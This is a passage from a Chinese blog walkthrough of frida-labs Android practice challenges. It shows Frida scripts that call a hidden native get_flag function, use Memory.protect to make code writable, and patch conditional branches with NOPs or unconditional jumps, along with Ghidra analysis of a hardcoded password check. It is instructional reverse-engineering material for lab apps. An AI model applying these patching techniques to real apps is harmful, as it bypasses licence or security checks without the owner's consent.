class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>需要参数的总和等于 <code>3</code> 才能通过 <code>if</code> 检查。因此，我们可以传递 <code>1</code> 和 <code>2</code> 作为参数并调用该方法。所以最终的脚本会是这样的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x18BB0</span>) <span class="comment">// Address of the get_flag() function</span></span><br><span class="line"><span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(adr);</span><br><span class="line"><span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"><span class="title function_">get_flag</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281626480.png" alt="img"> </p><p>下面检查一下日志输出：</p><p>使用 <code>adb logcat</code>监听一下日志输出</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281626531.png" alt="img"> </p><p>这块可以hook <code>_android_log_print</code>这个导出函数，打印它的最后一个参数也可以！</p><h1 id="challenge-0x0B"><a href="#challenge-0x0B" class="headerlink" title="challenge 0x0B"></a>challenge 0x0B</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281629677.png" alt="image.png"> </p><p>单击该按钮不会输出任何内容，没有什么参考价值。直接使用 jadx 吧。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281630098.png" alt="image.png"> </p><p>在反编译开始时，我们可以看到原生函数 <code>getFlag()</code> 的声明。</p><p>在底部，我们可以看到应用程序使用 <code>System.loadLibrary()</code> 加载 <code>frida0xb.so</code> 。</p><p>在 <code>onCreate</code> 方法中，它调用本机函数中的 <code>getFlag()</code> 方法。它不接受任何参数，也不返回任何内容。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281630163.png" alt="image.png"> </p><p>查看反编译后的代码，<code>getFlag()</code>函数，内容为空。这明显不科学。</p><p>继续查看汇编代码，发现是有代码片段的：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281630818.png" alt="image.png"> </p><p>首先，它将值 <code>0xdeadbeef</code> 加载到局部变量 <code>local_14</code> 中，然后将其与 <code>0x539</code> 进行比较。我们知道他们不相等。仅当满足此条件时才会执行下面的代码块。因此，ghidra 优化了其反编译，因为这种比较永远不会成立。您可以使用图表选项获得更好的想法。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632102.png" alt="image.png"> </p><p>因此，为了获得反编译，我们可以禁用 ghidra 中的优化。转到 <code>Edit</code> 选项 -&gt; <code>Tools Options</code> 。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632205.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632786.png" alt="image.png"> </p><p>点击确认后，反编译的代码可以正常显示了：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632195.png" alt="image.png"> </p><p>那么问题来了，如何获得flag呢？</p><p>可以看到这块的<code>if</code>循环，当判断为<code>false</code>的时候，才会向下执行代码。</p><p>单击按钮时将调用该函数。但由于 <code>if</code> 检查永远不会为真，因此我们不会得到该标志。</p><p>如果我们可以修改这些汇编指令，那让if语句不跳转，那不就可以正常执行代码了吗。</p><p>为了修改&#x2F;临时修补指令，我们可以使用 x86 架构的 <code>X86Writer</code> 类和 ARM64 架构的 <code>Arm64Writer</code> 类。</p><p>当我使用 <code>x86</code> 时，我将使用 <code>X86Writer</code> 。让我们看一个基本模板。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(&lt;address_of_the_instruction&gt;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// Insert instructions</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush the changes to memory</span></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="comment">// Dispose of the X86Writer to free up resources</span></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>**X86Writer**</code> <strong>的实例化：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var writer = new X86Writer(&lt;address_of_the_instruction&gt;);</span><br></pre></td></tr></table></figure><ul><li>这将创建 <code>X86Writer</code> 类的实例并指定我们要修改的指令的地址。这将设置写入器在指定的内存位置上进行操作。</li></ul><p><strong>Inserting instructions: 插入说明：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123; /* Insert instructions here */ &#125;</span><br></pre></td></tr></table></figure><ul><li>在 <code>try</code> 块中，我们可以插入要修改&#x2F;添加的 x86 指令。 <code>X86Writer</code> 实例提供了插入各种x86指令的各种方法。我们可以为此使用文档。</li></ul><p><strong>Flushing the Changes : 刷新更改：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">writer.flush();</span><br></pre></td></tr></table></figure><ul><li>插入指令后，调用 <code>flush</code> 方法将更改应用到内存。这可确保将修改后的指令写入内存位置。</li></ul><p><strong>Cleanup : 清理 ：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">finally &#123; /* Dispose of the X86Writer to free up resources */ writer.dispose(); &#125;</span><br></pre></td></tr></table></figure><ul><li><code>finally</code> 块用于确保正确清理 <code>X86Writer</code> 资源。调用 <code>dispose</code> 方法来释放与 <code>X86Writer</code> 实例关联的资源。</li></ul><p>现在我们对模板有了一个大概的了解。接下来，我们必须找出要修补&#x2F;修改的指令。这需要一些逆向工程基础知识。请考虑以下三个说明。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281907958.png" alt="image.png"> </p><p>首先，它将 <code>0xdeadbeef</code> 加载到 <code>local_14</code> 中，然后将其与 <code>0x539</code> 进行比较。如果两个操作数相同， <code>CMP</code> 指令将设置零标志。在这个 <code>CMP</code> 指令之后，我们有一个 <code>JNZ</code> 指令。如果零标志未设置，该指令（跳转非零）会将执行流程更改为指定地址。如果设置了零标志，则不会跳转并继续执行下一条指令。但不幸的是，在这种情况下，由于 <code>0xdeadbeef</code> 不等于 <code>0x539</code> ，因此不会设置零标志，并且 <code>JNZ</code> 指令将跳转到地址 &lt; b9&gt; 这是函数的结尾。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281906911.png" alt="img"> </p><p>我们希望应用程序不进行跳转，以便继续执行下一条指令、解码并记录我们的标志。因此我们可以修补 <code>JNZ</code> 指令，使其不进行跳转。我们可以将 <code>JNZ</code> 替换为 <code>NOP</code> 指令。 <code>NOP</code> 代表无操作。除了将执行传递给下一条指令之外，它不执行任何其他操作。通过替换 <code>NOP</code> 代替 <code>JNZ</code> ，执行将继续而不跳转，并记录标志。您还可以尝试其他指令，例如 <code>JE</code> ，它与 <code>JNZ</code> 相反。</p><h2 id="使用-X86Writer-修补"><a href="#使用-X86Writer-修补" class="headerlink" title="使用 X86Writer 修补"></a>使用 X86Writer 修补</h2><p>首先找到我们想要修补的 <code>JNZ</code> 指令的地址。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281907864.png" alt="image.png"> </p><p>我们可以通过用基数 <code>0x00010000</code> 减去 <code>0x20e2a</code> 来找到偏移量。现在要获取实际的函数地址，我们可以使用将此偏移量与基地址相加。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.ad2001.frida0xb ]-&gt; Module.getBaseAddress(&quot;libfrida0xb.so&quot;)</span><br><span class="line">&quot;0xc2083000&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.ad2001.frida0xb ]-&gt; Module.getBaseAddress(&quot;libfrida0xb.so&quot;).add(0x20e2a - 0x00010000)</span><br><span class="line">&quot;0xc2093e2a&quot;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们需要将 <code>NOP</code> 指令放置在 <code>JNZ</code> 指令的位置。要放置 <code>NOP</code> 指令，我们可以使用方法 <code>PutNop()</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908769.png" alt="image.png"> </p><p>可以参考文档：<a href="https://frida.re/docs/javascript-api/#x86writer">https://frida.re/docs/javascript-api/#x86writer</a></p><p>在更新脚本之前，请考虑一下这一点。这里应该放置多少个 <code>NOP</code> 指令？</p><p>典型 <code>x86</code> 架构中 <code>NOP</code> 指令的大小为1字节。但是看看我们试图替换的 <code>JNZ</code> 指令的大小，它是6个字节。</p><p>从 <code>0x00020e30</code> 中减去 <code>0x00020e2a</code> 得到 6。总之，我们必须在 <code>JNZ</code> 的位置放置 6 个 <code>NOP</code> 指令，因为在修补时指令与其他指令的比较，必须保证新指令的大小占被替换指令的大小。那么我们来更新一下脚本吧。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908482.png" alt="image.png"> </p><p>程序崩溃了。该错误表明进程由于保护失败而崩溃。发生此崩溃的原因是，我们尝试写入没有写入权限的内存。我们正在尝试写入二进制文件的 <code>.text</code> 部分。默认情况下它没有 <code>write</code> 权限。这就是它崩溃的原因。我们可以使用 ghidra 的内存映射工具来检查这一点。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908022.png" alt="image.png"> </p><p>那这种问题怎么解决呢？？？</p><p>这里使用 <code>Memory.protect</code> 函数。我们可以使用这个函数来修改内存区域的保护属性。 <code>Memory.protect</code> 函数的语法是：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(address, size, protection);</span><br></pre></td></tr></table></figure><p><code>address</code> ：要更改保护的内存区域的起始地址。</p><p><code>size</code> ：内存区域的大小（以字节为单位）。</p><p><code>protection</code> ：内存区域的保护属性。</p><p>我们可以使用此函数使 <code>.text</code> 部分可写。我们不会使整个部分都可写。我们只需要更改一个小区域的权限，这样我们就可以插入 <code>NOP</code> 指令而不会导致应用程序崩溃。在我们的例子中，我们可以提供 <code>JNZ</code> 函数的地址作为 <code>Memory.protect()</code> 函数的第一个参数。对于大小，我们可以指定 <code>0x1000</code> ，这已经足够了，因为我们的 <code>NOP</code> 指令只需要 6 个字节。为了保护，我们需要读、写和执行。所以我们可以传递 <code>rwx</code> 。</p><p>最后脚本更新为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(jnz, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908263.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908243.png" alt="img"> </p><h2 id="使用Arm64Writer修补"><a href="#使用Arm64Writer修补" class="headerlink" title="使用Arm64Writer修补"></a>使用Arm64Writer修补</h2><p>让我们在 ARM64 设备上尝试一下同样的事情。对于 ARM64，我们必须使用 ARM64 编写器。</p><p>让我们反编译该应用程序以获得 ARM64 的 <code>libfrida0xb.so</code> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909835.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909819.png" alt="img"> </p><p>在 x86 中，我们看到了 <code>cmp</code> 指令，但在这里我们看到了 <code>subs</code> 指令。它从 0xdeadbeef 中减去 <code>0x539</code> ；如果结果为零，则设置零标志。如果未设置零标志，则 <code>b.ne LAB_0011532c</code> （不等于则转移）指令将跳转到位置 <code>LAB_0011532c</code> 。否则，不会跳转，并执行 <code>b.ne LAB_0011532c</code> 之后的下一条指令。我们不希望它跳跃。因此，与我们上面所做的类似，我们可以修补 <code>b.ne</code> 指令。让我们尝试一些不同的东西，而不是使用 <code>nop</code> 指令。</p><p>让我们用 <code>b</code> 指令替换 <code>b.ne</code> 。无论标志如何，这都将分支到指定的标签或位置。我们可以将 <code>b.ne</code> 指令替换为直接分支到下一条指令的分支指令。</p><p>让我们使用文档来看看哪个方法提供了此指令。</p><p><a href="https://frida.re/docs/javascript-api/#arm64writer">https://frida.re/docs/javascript-api/#arm64writer</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909797.png" alt="img"> </p><p>现在我们需要重复上面的过程来找到 <code>b.ne</code> 指令的地址以及下一条指令的地址，以便我们可以将该地址传递给 <code>putBImm(address)</code> 函数。您可以使用 ghidra 来查找偏移量。我不会再解释了。</p><p>所以得到偏移量后，可以通过 <code>Module.findBaseAddress(&quot;libfrida0xb.so&quot;)</code> 找到基址，加上偏移量，就得到了指令的实际地址。让我们编写最终的脚本。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x15248</span>);  <span class="comment">// Addres of the b.ne instruction</span></span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(adr, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(adr);  <span class="comment">// ARM64 writer object</span></span><br><span class="line"><span class="keyword">var</span> target = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1524c</span>);  <span class="comment">// Address of the next instruction  b  LAB_00115250</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putBImm</span>(target);   <span class="comment">// Inserts the &lt;b target&gt; instruction in the place of b.ne instruction</span></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Branch instruction inserted at <span class="subst">$&#123;adr&#125;</span>`</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 ARM64 中，您不必担心指令的对齐方式，因为所有指令都是 4 字节对齐的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909917.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909169.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida-labs(2)</title>
      <link href="/2024/07/27/frida-labs(2)/"/>
      <url>/2024/07/27/frida-labs(2)/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="challenge-0x08"><a href="#challenge-0x08" class="headerlink" title="challenge 0x08"></a>challenge 0x08</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281144561.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281144245.png" alt="image.png"> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.ad2001.frida0x8.MainActivity.1</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edt.getText().toString();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.cmpstr(ip);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;YEY YOU GOT THE FLAG &quot;</span> + ip, <span class="number">1</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;TRY AGAIN&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>首先<code>onClick</code>函数，将用户输入作为参数，传入了<code>cmpstr</code> 方法中，并返回了一个整数值</li><li>如果返回值为1，则输出用户输入的文本内容，否则返回 “TRY AGAIN”</li></ul><p><code>cmpstr</code> 方法为<code>native</code>中定义的，函数接受一个字符串作为参数并返回一个整数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281147466.png" alt="image.png"> </p><p>直接解压apk文件,或使用apktool等反编译工具，在&#x2F;resources&#x2F;lib&#x2F;目录下存放了对应的.so文件</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281148523.png" alt="image.png"> </p><p>大多数物理设备都基于 ARM64 架构，这块使用模拟器打开apk，所以使用 <code>x86</code> 库。但不会有太大区别。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281148984.png" alt="image.png"> </p><p>可以使用IDA等逆向汇编工具打开so文件，这块使用一个新工具：Ghidra</p><p>具体使用教程可参考：<a href="https://www.youtube.com/watch?v=fTGTnrgjuGA">https://www.youtube.com/watch?v=fTGTnrgjuGA</a></p><p>1、将文件导入，单击 <code>Yes</code> 并等待分析完成。</p><p>点击Export查看导出函数，找到了<code>cmpstr</code> 函数：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281148827.png" alt="image.png"> </p><p>2、这时候可以看到对应的汇编和反汇编代码了，代码能力不行，直接AI即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><span class="params">(_JNIEnv **env, undefined8 param_2, undefined8 str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  <span class="type">long</span> lVar3;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_c4;</span><br><span class="line">  <span class="type">char</span> local_78 [<span class="number">104</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>); <span class="comment">// 保存一个安全检查的值，用于检测栈溢出</span></span><br><span class="line">  __s1 = (<span class="type">char</span> *)_JNIEnv::GetStringUTFChars(*env, str, <span class="number">0</span>); <span class="comment">// 从JNI环境获取Java字符串的UTF-8表示</span></span><br><span class="line">  local_c4 = <span class="number">0</span>; <span class="comment">// 初始化循环计数器</span></span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123; <span class="comment">// 无限循环</span></span><br><span class="line">    uVar2 = __strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xffffffffffffffff</span>); <span class="comment">// 获取一个硬编码字符串的长度</span></span><br><span class="line">    <span class="keyword">if</span> (uVar2 &lt;= (ulong)(<span class="type">long</span>)local_c4) <span class="keyword">break</span>; <span class="comment">// 如果已经复制了所有字符，则退出循环</span></span><br><span class="line">    local_78[local_c4] = <span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>[local_c4] + <span class="number">-1</span>; <span class="comment">// 将硬编码字符串的每个字符减1后复制到local_78数组</span></span><br><span class="line">    local_c4 = local_c4 + <span class="number">1</span>; <span class="comment">// 增加计数器</span></span><br><span class="line">  &#125;</span><br><span class="line">  lVar3 = __strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xffffffffffffffff</span>); <span class="comment">// 再次获取硬编码字符串的长度</span></span><br><span class="line">  local_78[lVar3] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 在字符串末尾添加空字符以结束字符串</span></span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(__s1, local_78); <span class="comment">// 比较输入的字符串和转换后的硬编码字符串</span></span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;input &quot;</span>, &amp;DAT_001006b0, __s1); <span class="comment">// 将输入的字符串记录到Android日志</span></span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;Password&quot;</span>, &amp;DAT_001006b0, local_78); <span class="comment">// 将转换后的字符串记录到Android日志</span></span><br><span class="line">  _JNIEnv::ReleaseStringUTFChars(*env, str, __s1); <span class="comment">// 释放JNI字符串资源</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>) == local_10) &#123; <span class="comment">// 检查栈是否溢出</span></span><br><span class="line">    <span class="keyword">return</span> iVar1 == <span class="number">0</span>; <span class="comment">// 如果字符串匹配，返回true，否则返回false</span></span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail(); <span class="comment">// 如果检测到栈溢出，则调用失败处理函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简而言之，这个函数的作用是：</p><ol><li>从JNI环境获取一个Java字符串的UTF-8表示。</li><li>将一个硬编码的字符串每个字符减1后存储到本地数组。</li><li>比较输入的字符串和转换后的字符串。</li><li>将输入的字符串和转换后的字符串记录到Android日志。</li><li>释放JNI字符串资源。</li><li>如果检测到栈溢出，则调用失败处理函数。</li></ol><p>返回值是布尔类型，如果输入的字符串和转换后的字符串匹配，则返回<code>true</code>，否则返回<code>false</code>。这里的字符串比较看起来像是一种简单的加密或编码过程，其中硬编码的字符串被每个字符减1后用于比较。</p><p>3、下面提供本机函数的源代码以便于解释。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><span class="params">(JNIEnv *env, jobject thiz, jstring str)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *inputStr = env-&gt;GetStringUTFChars(str, <span class="number">0</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hardcoded = <span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(hardcoded) ; i++) &#123;</span><br><span class="line"></span><br><span class="line">        password[i] = (<span class="type">char</span>)(hardcoded[i] - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    password[<span class="built_in">strlen</span>(hardcoded)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="type">int</span> result = <span class="built_in">strcmp</span>(inputStr, password);</span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, <span class="string">&quot;input &quot;</span>, <span class="string">&quot;%s&quot;</span>,inputStr);</span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, <span class="string">&quot;Password&quot;</span>, <span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">    env-&gt;ReleaseStringUTFChars(str, inputStr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returning result: 1 if equal, 0 if not equal</span></span><br><span class="line">    <span class="keyword">return</span> (result == <span class="number">0</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面针对代码逐句解释下：</p><p>这声明了一个名为 <code>cmpstr</code> 的 JNI（Java 本机接口）函数。它从 Java 代码 ( <code>Java_com_ad2001_frida0x8_MainActivity_cmpstr</code> ) 中调用。</p><p>有三个参数： <code>env</code> 表示 JNI 环境， <code>thiz</code> 表示 Java 对象， <code>str</code> 表示 Java 字符串。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern &quot;C&quot; JNIEXPORT jint JNICALL</span><br><span class="line">Java_com_ad2001_frida0x8_MainActivity_cmpstr(JNIEnv *env, jobject thiz, jstring str)</span><br></pre></td></tr></table></figure><p>从 Java 字符串 ( <code>jstring</code> ) 检索输入字符串并将其转换为 c 样式字符串 ( <code>const char*</code> )。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const char *inputStr = env-&gt;GetStringUTFChars(str, 0);</span><br></pre></td></tr></table></figure><p>变量 <code>hardcoded</code> 包含一个硬编码值，并且还声明了一个数组 <code>password</code> 。</p><p>该循环通过减 1 来转换 <code>hardcoded</code> 中的每个字符，并将结果存储在 <code>password</code> 数组中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const char *hardcoded = &quot;GSJEB|OBUJWF`MBOE~&quot;;</span><br><span class="line">char password[100];</span><br><span class="line">for (int i = 0; i &lt; strlen(hardcoded); i++) &#123;</span><br><span class="line">    password[i] = (char)(hardcoded[i] - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 